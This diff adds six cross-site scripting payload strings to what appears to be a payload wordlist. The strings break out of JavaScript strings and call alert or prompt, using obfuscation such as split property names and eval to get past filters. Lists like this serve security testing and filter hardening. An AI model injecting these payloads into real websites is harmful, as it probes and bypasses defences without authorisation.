@@ -1,0 +1,6 @@
+"-top[%27al\x65rt%27](%27sailay%27)-"
+"-alert``-"
+"-prompt(8)-"
+'-prompt(8)-'
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
